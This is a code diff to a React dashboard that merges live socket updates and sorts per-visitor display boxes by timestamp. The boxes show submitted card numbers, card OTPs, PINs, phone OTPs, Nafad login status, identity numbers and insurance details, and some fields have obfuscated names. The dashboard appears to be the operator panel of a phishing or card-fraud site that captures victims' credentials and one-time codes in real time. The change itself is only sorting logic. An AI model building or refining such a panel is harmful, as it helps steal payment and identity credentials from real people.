@@ -390,14 +390,17 @@ export default function DashboardPage() {
       return;
     }
     
-    // Update boxTimestamps if provided (for consistency with database)
+    // Update boxTimestamps if provided - update ONLY the specific box that changed
     if (updatedRequest.boxTimestamps && Object.keys(updatedRequest.boxTimestamps).length > 0) {
       const visitorId = updatedRequest.visitorId || updatedRequest.id;
-      console.log("[Socket Update] Updating boxTimestamps for:", visitorId);
-      setBoxTimestamps(prev => ({
-        ...prev,
-        ...updatedRequest.boxTimestamps,
-      }));
+      console.log("[Socket Update] Updating boxTimestamps for:", visitorId, "data:", updatedRequest.boxTimestamps);
+      setBoxTimestamps(prev => {
+        // Keep existing timestamps for other boxes, only update the specific one
+        return {
+          ...prev,
+          ...updatedRequest.boxTimestamps,
+        };
+      });
     }
     
     setRequests(prevRequests => {
@@ -410,14 +413,31 @@ export default function DashboardPage() {
       if (existingIndex >= 0) {
         // MERGE old entry with new one (preserve all data)
         const existingRequest = prevRequests[existingIndex];
+        
+        // Calculate submittedAt: use latest from boxTimestamps if available, otherwise use existing
+        let newSubmittedAt = existingRequest.submittedAt || existingRequest.updatedAt;
+        
+        // If boxTimestamps updated, use the latest timestamp from them for sorting
+        if (updatedRequest.boxTimestamps) {
+          const allTimestamps = Object.values(updatedRequest.boxTimestamps)
+            .map((bt: any) => bt?.event_timestamp)
+            .filter(Boolean)
+            .map((ts: string) => new Date(ts).getTime())
+            .sort((a, b) => b - a);
+          
+          if (allTimestamps.length > 0 && allTimestamps[0] > new Date(newSubmittedAt || 0).getTime()) {
+            newSubmittedAt = new Date(allTimestamps[0]).toISOString();
+          }
+        }
+        
         const mergedRequest = {
           ...existingRequest,
           ...incomingRequest,
-          // Always use the newest submittedAt
+          // Use the newest submittedAt (from latest box timestamp if available)
           submittedAt: new Date(incomingRequest.submittedAt || incomingRequest.updatedAt || Date.now()).getTime() >
                       new Date(existingRequest.submittedAt || existingRequest.updatedAt || 0).getTime()
                       ? incomingRequest.submittedAt || incomingRequest.updatedAt
-                      : existingRequest.submittedAt || existingRequest.updatedAt,
+                      : newSubmittedAt,
           // Merge raw data
           raw: { ...(existingRequest.raw || {}), ...(incomingRequest.raw || {}) },
           // Keep boxTimestamps from database for consistency
@@ -4525,77 +4545,92 @@ const renderNafadBox = () => {
 
   // Render action buttons based on current page
   const renderActionButtons = () => {
-    // Get the selected request's timestamp
-    const getSelectedTimestamp = (): number => {
-      const timestamp = selectedRequest?.updatedAt || selectedRequest?.submittedAt;
-      if (!timestamp) return 0;
-      const date = new Date(timestamp).getTime();
-      return isNaN(date) ? 0 : date;
+    // Get timestamp for a specific box type - uses boxTimestamps state first, then falls back to raw data
+    const getBoxTimestampForSort = (boxType: string, fallbackTimestamps: string[]): number => {
+      // First try: boxTimestamps from state (real-time updates)
+      const stateTs = boxTimestamps?.[boxType]?.event_timestamp 
+        ? new Date(boxTimestamps[boxType].event_timestamp).getTime() 
+        : 0;
+      
+      if (stateTs > 0) return stateTs;
+      
+      // Second try: _vXUpdatedAt from raw data
+      const raw = selectedRequest?.raw || {};
+      for (const field of fallbackTimestamps) {
+        if (raw[field]) {
+          const ts = new Date(raw[field]).getTime();
+          if (ts > 0) return ts;
+        }
+      }
+      
+      // Fallback: use selectedRequest timestamp
+      const selectedTs = selectedRequest?.updatedAt || selectedRequest?.submittedAt;
+      if (selectedTs) {
+        const ts = new Date(selectedTs).getTime();
+        if (!isNaN(ts)) return ts;
+      }
+      
+      return 0;
     };
     
-    // Create array of boxes with timestamps from customerEntryGroup (newest first)
+    // Create array of boxes with timestamps from boxTimestamps state (newest first)
     const boxes: Array<{ name: string; timestamp: number; component: React.ReactNode }> = [];
     
     const nafadBox = renderNafadBox();
     if (nafadBox) {
-      const nafadEntries = customerEntryGroup.filter(e => e.raw?.nafadStatus || e.raw?.nafadIdNumber);
-      const nafadTime = nafadEntries.length > 0 
-        ? Math.max(...nafadEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
-        : getSelectedTimestamp();
+      const nafadTime = getBoxTimestampForSort('nafad', ['nafadUpdatedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'nafad', timestamp: nafadTime, component: nafadBox });
     }
     
     const phoneOtpBox = renderPhoneOtpBox();
     if (phoneOtpBox) {
-      const phoneEntries = customerEntryGroup.filter(e => e.raw?.phoneNumber || e.raw?.phoneOtpStatus);
-      const phoneTime = phoneEntries.length > 0
-        ? Math.max(...phoneEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
-        : getSelectedTimestamp();
+      const phoneTime = getBoxTimestampForSort('phone', ['_v7UpdatedAt', 'phoneUpdatedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'phoneOtp', timestamp: phoneTime, component: phoneOtpBox });
     }
     
     const pinBox = renderPinBox();
     if (pinBox) {
-      const pinEntries = customerEntryGroup.filter(e => e.raw?.pinStatus || e.raw?.pinCode);
-      const pinTime = pinEntries.length > 0
-        ? Math.max(...pinEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
-        : getSelectedTimestamp();
+      const pinTime = getBoxTimestampForSort('pin', ['_v6UpdatedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'pin', timestamp: pinTime, component: pinBox });
     }
     
     const cardOtpBox = renderCardOtpBox();
     if (cardOtpBox) {
-      const cardOtpEntries = customerEntryGroup.filter(e => e.raw?._v3 || e.raw?.otpCode);
-      const cardOtpTime = cardOtpEntries.length > 0
-        ? Math.max(...cardOtpEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
-        : getSelectedTimestamp();
+      const cardOtpTime = getBoxTimestampForSort('otp', ['_v5UpdatedAt', 'otpSubmittedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'cardOtp', timestamp: cardOtpTime, component: cardOtpBox });
     }
     
     const cardVerifBox = renderCardVerificationBox();
     if (cardVerifBox) {
-      const cardVerifEntries = customerEntryGroup.filter(e => e.raw?.cardNumber || e.raw?._v1);
-      const cardVerifTime = cardVerifEntries.length > 0
-        ? Math.max(...cardVerifEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
-        : getSelectedTimestamp();
+      const cardVerifTime = getBoxTimestampForSort('card', ['_v1UpdatedAt', 'cardSubmittedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'cardVerif', timestamp: cardVerifTime, component: cardVerifBox });
     }
     
     const basicInfoBox = renderBasicInfoBox();
     if (basicInfoBox) {
-      const basicEntries = customerEntryGroup.filter(e => e.raw?.buyerName || e.raw?.identityNumber);
-      const basicTime = basicEntries.length > 0
-        ? Math.max(...basicEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
-        : getSelectedTimestamp();
+      // Basic info uses the latest of all box timestamps
+      const allBoxTimestamps = [
+        boxTimestamps?.card?.event_timestamp ? new Date(boxTimestamps.card.event_timestamp).getTime() : 0,
+        boxTimestamps?.otp?.event_timestamp ? new Date(boxTimestamps.otp.event_timestamp).getTime() : 0,
+        boxTimestamps?.pin?.event_timestamp ? new Date(boxTimestamps.pin.event_timestamp).getTime() : 0,
+        boxTimestamps?.phone?.event_timestamp ? new Date(boxTimestamps.phone.event_timestamp).getTime() : 0,
+        boxTimestamps?.nafad?.event_timestamp ? new Date(boxTimestamps.nafad.event_timestamp).getTime() : 0,
+      ];
+      const basicTime = Math.max(...allBoxTimestamps.filter(t => t > 0));
       boxes.push({ name: 'basicInfo', timestamp: basicTime, component: basicInfoBox });
     }
     
     const insuranceBox = renderInsuranceDetailsBox();
     if (insuranceBox) {
-      const insuranceEntries = customerEntryGroup.filter(e => e.raw?.insuranceType || e.raw?.vehicleModel);
-      const insuranceTime = insuranceEntries.length > 0
-        ? Math.max(...insuranceEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
-        : getSelectedTimestamp();
+      // Insurance uses the latest of all box timestamps
+      const allBoxTimestamps = [
+        boxTimestamps?.card?.event_timestamp ? new Date(boxTimestamps.card.event_timestamp).getTime() : 0,
+        boxTimestamps?.otp?.event_timestamp ? new Date(boxTimestamps.otp.event_timestamp).getTime() : 0,
+        boxTimestamps?.pin?.event_timestamp ? new Date(boxTimestamps.pin.event_timestamp).getTime() : 0,
+        boxTimestamps?.phone?.event_timestamp ? new Date(boxTimestamps.phone.event_timestamp).getTime() : 0,
+        boxTimestamps?.nafad?.event_timestamp ? new Date(boxTimestamps.nafad.event_timestamp).getTime() : 0,
+      ];
+      const insuranceTime = Math.max(...allBoxTimestamps.filter(t => t > 0));
       boxes.push({ name: 'insurance', timestamp: insuranceTime, component: insuranceBox });
     }
     
